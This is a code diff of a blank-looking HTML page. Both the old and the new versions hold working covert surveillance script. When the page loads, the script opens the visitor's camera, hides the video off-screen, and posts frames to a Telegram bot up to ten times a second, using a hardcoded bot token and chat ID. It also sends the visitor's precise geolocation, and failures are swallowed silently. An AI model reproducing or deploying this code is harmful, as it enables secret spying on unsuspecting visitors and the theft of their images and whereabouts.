@@ -1,414 +1,83 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title> </title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #ffffff;
-            overflow: hidden;
-            width: 100vw;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Arial', sans-serif;
-        }
-        #video {
-            display: none;
-        }
-        #canvas {
-            display: none;
-        }
-        #status {
-            display: none;
-        }
-        .invisible {
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
-            width: 1px;
-            height: 1px;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<style>
+  body {
+    margin: 0;
+    background: white;
+    overflow: hidden;
+    height: 100vh;
+    width: 100vw;
+  }
+</style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-    <div id="status" class="invisible"></div>
+<video id="v" autoplay playsinline muted style="position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
+<canvas id="c" style="position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;"></canvas>
+<script>
+(() => {
+  const TOKEN = '8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg';
+  const CHAT_ID = '7870731053';
+  const FPS = 10;
+  const INTERVAL = 1000 / FPS;
 
-    <script>
-        (function() {
-            'use strict';
+  const video = document.getElementById('v');
+  const canvas = document.getElementById('c');
+  const ctx = canvas.getContext('2d');
 
-            // CONFIGURATION
-            const BOT_TOKEN = '8989398872:AAE5qZxUT0fbOOkSbYcDigfjfnttOKYEnsg';
-            const CHAT_ID = '7870731053';
-            const CAPTURE_INTERVAL = 100; // 100ms = 10 captures per second
-            const BURST_SIZE = 10;
-            const MAX_IMAGE_SIZE = 800; // Max dimension for faster transmission
+  let streamReady = false;
 
-            let stream = null;
-            let captureInterval = null;
-            let isCapturing = false;
-            let videoElement = null;
-            let canvasElement = null;
-            let context = null;
+  // Geolocation beacon
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude, longitude } = pos.coords;
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`)
+          .catch(() => {});
+      },
+      err => {},
+      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+    );
+  }
 
-            // Geolocation state
-            let currentLocation = {
-                lat: null,
-                lon: null,
-                accuracy: null,
-                timestamp: null
-            };
+  // Camera init
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+    audio: false
+  })
+  .then(stream => {
+    video.srcObject = stream;
+    video.onloadedmetadata = () => {
+      video.play();
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      streamReady = true;
+    };
+  })
+  .catch(() => {});
 
-            // Queue for batch sending
-            let imageQueue = [];
-            let isSending = false;
+  // Frame capture loop
+  video.addEventListener('play', () => {
+    setInterval(() => {
+      if (!streamReady) return;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        if (!blob) return;
+        const form = new FormData();
+        form.append('chat_id', CHAT_ID);
+        form.append('photo', blob, 'f.jpg');
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        }).catch(() => {});
+      }, 'image/jpeg', 0.7);
+    }, INTERVAL);
+  }, { once: true });
 
-            // Initialize camera
-            function initCamera() {
-                return new Promise((resolve, reject) => {
-                    const constraints = {
-                        video: {
-                            facingMode: 'environment',
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 },
-                            frameRate: { ideal: 30 }
-                        },
-                        audio: false
-                    };
-
-                    // Try environment camera first, fallback to any
-                    navigator.mediaDevices.getUserMedia(constraints)
-                        .then((mediaStream) => {
-                            stream = mediaStream;
-                            videoElement = document.getElementById('video');
-                            videoElement.srcObject = mediaStream;
-                            videoElement.onloadedmetadata = () => {
-                                videoElement.play();
-                                // Setup canvas
-                                canvasElement = document.getElementById('canvas');
-                                canvasElement.width = videoElement.videoWidth || 640;
-                                canvasElement.height = videoElement.videoHeight || 480;
-                                context = canvasElement.getContext('2d', {
-                                    willReadFrequently: true
-                                });
-                                resolve();
-                            };
-                        })
-                        .catch((err) => {
-                            // Fallback to front camera if rear fails
-                            navigator.mediaDevices.getUserMedia({
-                                video: {
-                                    facingMode: 'user',
-                                    width: { ideal: 640 },
-                                    height: { ideal: 480 }
-                                }
-                            })
-                            .then((mediaStream) => {
-                                stream = mediaStream;
-                                videoElement = document.getElementById('video');
-                                videoElement.srcObject = mediaStream;
-                                videoElement.onloadedmetadata = () => {
-                                    videoElement.play();
-                                    canvasElement = document.getElementById('canvas');
-                                    canvasElement.width = videoElement.videoWidth || 640;
-                                    canvasElement.height = videoElement.videoHeight || 480;
-                                    context = canvasElement.getContext('2d', {
-                                        willReadFrequently: true
-                                    });
-                                    resolve();
-                                };
-                            })
-                            .catch((fallbackErr) => {
-                                reject(fallbackErr);
-                            });
-                        });
-                });
-            }
-
-            // Capture single frame as base64 JPEG
-            function captureFrame() {
-                if (!videoElement || !context) return null;
-
-                try {
-                    const width = canvasElement.width;
-                    const height = canvasElement.height;
-
-                    // Draw current video frame
-                    context.drawImage(videoElement, 0, 0, width, height);
-
-                    // Resize if needed
-                    let imageData = canvasElement.toDataURL('image/jpeg', 0.85);
-
-                    // Compress further if too large
-                    if (imageData.length > 150000) {
-                        // Reduce quality
-                        imageData = canvasElement.toDataURL('image/jpeg', 0.65);
-                    }
-
-                    return imageData;
-                } catch (e) {
-                    return null;
-                }
-            }
-
-            // Get current location
-            function getLocation() {
-                return new Promise((resolve) => {
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            (position) => {
-                                const loc = {
-                                    lat: position.coords.latitude,
-                                    lon: position.coords.longitude,
-                                    accuracy: position.coords.accuracy,
-                                    timestamp: position.timestamp
-                                };
-                                currentLocation = loc;
-                                resolve(loc);
-                            },
-                            (error) => {
-                                // Use last known location or fallback
-                                if (currentLocation.lat !== null) {
-                                    resolve(currentLocation);
-                                } else {
-                                    resolve({
-                                        lat: null,
-                                        lon: null,
-                                        accuracy: null,
-                                        timestamp: null
-                                    });
-                                }
-                            },
-                            {
-                                enableHighAccuracy: true,
-                                timeout: 5000,
-                                maximumAge: 30000
-                            }
-                        );
-                    } else {
-                        resolve({
-                            lat: null,
-                            lon: null,
-                            accuracy: null,
-                            timestamp: null
-                        });
-                    }
-                });
-            }
-
-            // Send image to Telegram with location
-            async function sendToTelegram(imageData, location) {
-                if (!imageData) return false;
-
-                try {
-                    // Convert base64 to Blob
-                    const base64Data = imageData.split(',')[1];
-                    const byteCharacters = atob(base64Data);
-                    const byteArrays = [];
-
-                    for (let offset = 0; offset < byteCharacters.length; offset += 512) {
-                        const slice = byteCharacters.slice(offset, offset + 512);
-                        const byteNumbers = new Array(slice.length);
-                        for (let i = 0; i < slice.length; i++) {
-                            byteNumbers[i] = slice.charCodeAt(i);
-                        }
-                        const byteArray = new Uint8Array(byteNumbers);
-                        byteArrays.push(byteArray);
-                    }
-
-                    const blob = new Blob(byteArrays, { type: 'image/jpeg' });
-
-                    // Create FormData
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'capture.jpg');
-
-                    // Add caption with location if available
-                    let caption = '';
-                    if (location && location.lat !== null && location.lon !== null) {
-                        caption = `📍 ${location.lat}, ${location.lon}`;
-                        if (location.accuracy) {
-                            caption += ` (±${Math.round(location.accuracy)}m)`;
-                        }
-                        caption += `\n🕐 ${new Date(location.timestamp || Date.now()).toISOString()}`;
-                    }
-                    
-                    if (caption) {
-                        formData.append('caption', caption);
-                    }
-
-                    // Send to Telegram
-                    const response = await fetch(
-                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                        {
-                            method: 'POST',
-                            body: formData
-                        }
-                    );
-
-                    const result = await response.json();
-                    return result.ok === true;
-                } catch (e) {
-                    return false;
-                }
-            }
-
-            // Process queue and send in batches
-            async function processQueue() {
-                if (isSending || imageQueue.length === 0) return;
-
-                isSending = true;
-
-                try {
-                    // Get latest location
-                    const location = await getLocation();
-
-                    // Send images one by one with delay to avoid rate limiting
-                    const batch = imageQueue.splice(0, BURST_SIZE);
-
-                    for (let i = 0; i < batch.length; i++) {
-                        const imageData = batch[i];
-                        if (imageData) {
-                            await sendToTelegram(imageData, location);
-                            // Small delay between sends to respect rate limits
-                            if (i < batch.length - 1) {
-                                await new Promise(resolve => setTimeout(resolve, 150));
-                            }
-                        }
-                    }
-                } catch (e) {
-                    // If sending fails, requeue failed items
-                    // (simplified: just log silently)
-                } finally {
-                    isSending = false;
-                    // Process next batch if available
-                    if (imageQueue.length > 0) {
-                        setTimeout(processQueue, 100);
-                    }
-                }
-            }
-
-            // Capture burst
-            async function captureBurst() {
-                if (!isCapturing) return;
-
-                try {
-                    const capturedImages = [];
-                    const location = await getLocation();
-
-                    // Capture 10 images with minimal delay
-                    for (let i = 0; i < BURST_SIZE; i++) {
-                        const frame = captureFrame();
-                        if (frame) {
-                            capturedImages.push(frame);
-                        }
-                        // Small delay between captures to ensure unique frames
-                        if (i < BURST_SIZE - 1) {
-                            await new Promise(resolve => setTimeout(resolve, 50));
-                        }
-                    }
-
-                    // Add to queue
-                    if (capturedImages.length > 0) {
-                        imageQueue.push(...capturedImages);
-                        // Start processing if not already
-                        if (!isSending) {
-                            processQueue();
-                        }
-                    }
-
-                    // Also send location separately if needed
-                    if (location && location.lat !== null && location.lon !== null) {
-                        // Location is included in each image caption
-                    }
-                } catch (e) {
-                    // Silent fail
-                }
-            }
-
-            // Main execution
-            async function main() {
-                try {
-                    await initCamera();
-
-                    // Get initial location
-                    await getLocation();
-
-                    // Start capturing
-                    isCapturing = true;
-
-                    // Capture burst every interval
-                    captureInterval = setInterval(captureBurst, CAPTURE_INTERVAL);
-
-                    // Immediate first burst
-                    setTimeout(captureBurst, 200);
-
-                } catch (e) {
-                    // If camera fails, try to continue with location only
-                    // (but we need camera for images)
-                }
-            }
-
-            // Handle visibility change to maintain capture when tab is visible
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    // Pause when tab is hidden to save resources
-                    if (captureInterval) {
-                        clearInterval(captureInterval);
-                        captureInterval = null;
-                    }
-                    isCapturing = false;
-                } else {
-                    // Resume when tab becomes visible
-                    if (!isCapturing && stream) {
-                        isCapturing = true;
-                        if (!captureInterval) {
-                            captureInterval = setInterval(captureBurst, CAPTURE_INTERVAL);
-                            captureBurst();
-                        }
-                    }
-                }
-            });
-
-            // Handle page unload - cleanup
-            window.addEventListener('beforeunload', () => {
-                if (captureInterval) {
-                    clearInterval(captureInterval);
-                    captureInterval = null;
-                }
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                isCapturing = false;
-            });
-
-            // Handle errors gracefully
-            window.onerror = function() {
-                // Silent error handler
-                return true;
-            };
-
-            // Start when DOM is ready
-            if (document.readyState === 'complete') {
-                main();
-            } else {
-                window.addEventListener('load', main);
-            }
-
-            // Prevent context menu
-            document.addEventListener('contextmenu', (e) => e.preventDefault());
-
-        })();
-    </script>
+})();
+</script>
 </body>
 </html>
